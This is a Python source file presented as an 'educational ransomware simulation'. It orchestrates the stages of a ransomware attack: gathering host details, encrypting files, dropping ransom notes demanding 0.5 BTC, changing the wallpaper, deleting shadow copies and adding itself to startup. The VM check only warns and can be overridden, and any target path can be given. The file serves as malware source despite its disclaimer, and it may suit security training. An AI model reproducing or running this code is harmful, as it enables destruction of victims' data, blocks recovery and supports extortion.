"""
ransomware_sim.py
Educational Ransomware Simulation - Main Orchestrator
FOR EDUCATIONAL USE ONLY - Run only in isolated VM
"""

import os
import sys
import time
import argparse
import logging
import uuid
from datetime import datetime

# Import our modules
from encryption_handler import EncryptionHandler
from file_scanner import FileScanner
from windows_api import WindowsAPIHandler
from ransom_note import RansomNoteGenerator

class RansomwareSimulator:
    """
    Main orchestrator for the ransomware simulation.
    """
    
    def __init__(self, target_path=None, password="educational_demo_2024"):
        """
        Initialize the ransomware simulator.
        """
        self.target_path = target_path or os.path.join(os.path.expanduser("~"), "RansomwareTest")
        self.password = password
        self.victim_id = str(uuid.uuid4())[:8]
        
        # Initialize components
        self.encryption = EncryptionHandler(password)
        self.scanner = FileScanner(self.target_path)
        self.win_api = WindowsAPIHandler()
        self.note_gen = RansomNoteGenerator(self.victim_id)
        
        # Statistics
        self.stats = {
            'start_time': None,
            'end_time': None,
            'files_encrypted': 0,
            'directories_scanned': 0,
            'ransom_notes_created': 0
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ransomware_sim.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def print_banner(self):
        """Display educational banner."""
        banner = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║     EDUCATIONAL RANSOMWARE SIMULATION                        ║
    ║                                                              ║
    ║     FOR EDUCATIONAL USE ONLY                                 ║
    ║     RUN ONLY IN ISOLATED VIRTUAL MACHINE                     ║
    ╚══════════════════════════════════════════════════════════════╝
    
    Victim ID: {self.victim_id}
    Target: {self.target_path}
        """
        print(banner)
        time.sleep(2)
    
    def safety_check(self):
        """
        Perform safety checks before execution.
        """
        self.logger.info("[SAFETY] Performing safety checks...")
        
        # Check if running in VM
        if not self.win_api.detect_virtualization():
            self.logger.warning("⚠️ NOT RUNNING IN DETECTED VM!")
            response = input("Continue in non-VM environment? (yes/NO): ")
            if response.lower() != 'yes':
                self.logger.info("Execution cancelled by user")
                sys.exit(0)
        
        # Verify target path exists and is safe
        if not os.path.exists(self.target_path):
            self.logger.info(f"[SETUP] Creating target directory: {self.target_path}")
            os.makedirs(self.target_path, exist_ok=True)
        
        # Create safety marker
        marker = os.path.join(self.target_path, ".SAFE_MARKER")
        with open(marker, 'w') as f:
            f.write("SAFE FOR RANSOMWARE SIMULATION\n")
        
        self.logger.info("[SAFETY] Checks passed")
        return True
    
    def reconnaissance(self):
        """
        Simulate reconnaissance phase.
        """
        self.logger.info("[RECON] Gathering system information...")
        
        # Get target drives
        drives = self.win_api.get_drives_to_encrypt()
        
        # Get system info
        info = {
            'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
            'user': os.environ.get('USERNAME', 'Unknown'),
            'os': os.environ.get('OS', 'Unknown'),
            'drives': drives
        }
        
        self.logger.info(f"[RECON] Target: {info['computer']}\\{info['user']}")
        return info
    
    def encrypt_phase(self):
        """
        Main encryption phase.
        """
        self.logger.info("[ENCRYPT] Starting encryption phase...")
        
        # Generate key
        self.encryption.generate_key()
        
        # Find files to encrypt
        target_files = self.scanner.scan_directory()
        
        if not target_files:
            self.logger.warning("[ENCRYPT] No target files found!")
            self.logger.info("[SETUP] Creating test files...")
            self.scanner.create_test_files()
            target_files = self.scanner.scan_directory()
        
        # Encrypt files
        encrypted_count = 0
        for filepath in target_files:
            result = self.encryption.encrypt_file(filepath)
            if result:
                encrypted_count += 1
                self.stats['files_encrypted'] = encrypted_count
                
                # Show progress
                if encrypted_count % 10 == 0:
                    self.logger.info(f"[ENCRYPT] Progress: {encrypted_count}/{len(target_files)}")
        
        self.logger.info(f"[ENCRYPT] Completed: {encrypted_count} files encrypted")
        return encrypted_count
    
    def post_encryption_phase(self, encrypted_count):
        """
        Post-encryption activities.
        """
        self.logger.info("[POST] Starting post-encryption activities...")
        
        # Create ransom notes
        note_paths = self.note_gen.create_note(
            output_dir=self.target_path,
            encrypted_count=encrypted_count,
            payment_amount="0.5 BTC"
        )
        self.stats['ransom_notes_created'] = len(note_paths)
        
        # Create HTML note
        html_note = self.note_gen.create_html_note(self.target_path)
        
        # Simulate post-encryption activities
        if note_paths:
            self.win_api.modify_desktop_wallpaper(note_paths[0])
        
        self.win_api.delete_shadow_copies()
        
        script_path = os.path.abspath(__file__)
        self.win_api.add_to_startup(script_path)
        
        self.logger.info("[POST] Post-encryption activities complete")
        
        return {
            'notes': note_paths,
            'html_note': html_note
        }
    
    def run_attack_simulation(self):
        """
        Execute full attack simulation.
        """
        self.stats['start_time'] = datetime.now()
        
        self.print_banner()
        self.safety_check()
        
        # Phase 1: Reconnaissance
        system_info = self.reconnaissance()
        
        # Phase 2: Encryption
        encrypted_count = self.encrypt_phase()
        
        # Phase 3: Post-encryption
        post_results = self.post_encryption_phase(encrypted_count)
        
        # Complete
        self.stats['end_time'] = datetime.now()
        duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
        
        # Summary
        self.logger.info("="*50)
        self.logger.info("SIMULATION COMPLETE")
        self.logger.info(f"Victim ID: {self.victim_id}")
        self.logger.info(f"Files encrypted: {encrypted_count}")
        self.logger.info(f"Ransom notes created: {len(post_results['notes'])}")
        self.logger.info(f"Duration: {duration:.2f} seconds")
        self.logger.info("="*50)
        
        # Open target folder (Windows only)
        if os.name == 'nt':
            try:
                os.startfile(self.target_path)
            except:
                pass
        
        return self.stats
    
    def decrypt_files(self):
        """
        Decrypt files for recovery demonstration.
        """
        self.logger.info("[DECRYPT] Starting decryption...")
        
        # Load key
        self.encryption.generate_key()
        
        # Find encrypted files
        encrypted_files = []
        for root, dirs, files in os.walk(self.target_path):
            for file in files:
                if file.endswith('.encrypted'):
                    encrypted_files.append(os.path.join(root, file))
        
        if not encrypted_files:
            self.logger.info("[DECRYPT] No encrypted files found")
            return 0
        
        # Decrypt each file
        decrypted_count = 0
        for filepath in encrypted_files:
            result = self.encryption.decrypt_file(filepath)
            if result:
                decrypted_count += 1
        
        self.logger.info(f"[DECRYPT] Complete: {decrypted_count} files decrypted")
        
        # Remove ransom notes
        for root, dirs, files in os.walk(self.target_path):
            for file in files:
                if 'ransom' in file.lower() or 'readme' in file.lower():
                    try:
                        os.remove(os.path.join(root, file))
                    except:
                        pass
        
        return decrypted_count
    
    def setup_test_environment(self):
        """
        Setup test environment with sample files.
        """
        self.logger.info("[SETUP] Creating test environment...")
        path = self.scanner.create_test_files()
        self.logger.info(f"[SETUP] Test files created in: {path}")
        return path


def main():
    """
    Command line interface.
    """
    parser = argparse.ArgumentParser(description="Educational Ransomware Simulation")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt files")
    parser.add_argument("--password", type=str, default="educational_demo_2024", 
                       help="Password for encryption/decryption")
    parser.add_argument("--path", type=str, help="Custom target path")
    parser.add_argument("--setup", action="store_true", help="Setup test environment only")
    
    args = parser.parse_args()
    
    # Create simulator instance
    sim = RansomwareSimulator(target_path=args.path, password=args.password)
    
    # Execute requested action
    if args.setup:
        sim.setup_test_environment()
    elif args.decrypt:
        sim.decrypt_files()
    else:
        sim.run_attack_simulation()


if __name__ == "__main__":
    main()